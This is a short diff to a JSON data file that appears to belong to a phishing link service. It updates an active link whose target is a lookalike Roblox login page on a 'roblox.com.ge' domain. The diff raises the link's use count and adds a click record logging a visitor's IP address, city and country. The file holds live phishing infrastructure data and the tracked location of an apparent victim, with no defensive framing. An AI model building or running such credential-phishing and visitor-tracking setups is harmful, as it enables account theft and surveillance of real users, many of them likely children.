@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1712,
+    "useCount": 1713,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13864,6 +13864,14 @@
         "city": "Villa Mercedes",
         "flag": "🇦🇷",
         "countryCode": "AR"
+      },
+      {
+        "timestamp": 1777686854812,
+        "ip": "104.28.153.54",
+        "country": "United States",
+        "city": "Miami",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
